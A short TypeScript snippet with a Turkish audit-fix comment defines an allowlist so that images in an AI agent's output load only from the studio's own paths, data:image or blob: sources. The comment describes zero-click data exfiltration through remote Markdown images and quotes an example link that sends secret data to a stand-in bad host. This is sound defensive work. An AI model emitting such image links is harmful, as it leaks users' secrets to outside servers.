// AUDIT-FIX #15: ajan çıktısındaki Markdown resmi tarayıcıya kendiliğinden istek attırır; uzak adres
// (`![](https://kotu.site/x?d=<gizli>)`) tıklamasız veri sızdırma kanalıdır. Yalnız stüdyonun kendi yolu, data:image ve
// blob: kaynakları yüklenir; "//host" ve "/\host" (tarayıcı "//host" sayar) uzak sayılır.
const SAFE_IMG = new RegExp("^(?:/(?![/\\\\])|data:image/|blob:)", "i");

export function isSafeImgSrc(src: unknown): src is string {
  return typeof src === "string" && SAFE_IMG.test(src.trim());
}
